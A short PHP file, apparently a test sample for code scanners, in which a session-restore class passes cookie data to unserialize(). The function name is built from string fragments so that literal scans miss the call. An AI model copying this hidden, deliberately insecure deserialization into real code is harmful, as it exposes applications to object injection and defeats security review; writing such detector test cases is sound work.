<?php
// Variable-function dispatch to unserialize. The token 'unserialize' never
// appears as a direct call or inside call_user_func(); it is assembled into a
// variable and invoked as $fn($payload) -- runtime-equivalent to unserialize().
class SessionRestore
{
    private array $handlers = [];

    public function __construct()
    {
        // Built from fragments so a literal scan for 'unserialize' is dodged.
        $this->handlers['php'] = 'un' . 'serialize';
    }

    public function restore(): mixed
    {
        $blob = base64_decode($_COOKIE['sess'] ?? '');
        $fn = $this->handlers['php'];
        return $fn($blob); // variable-function call -> unserialize($blob)
    }
}
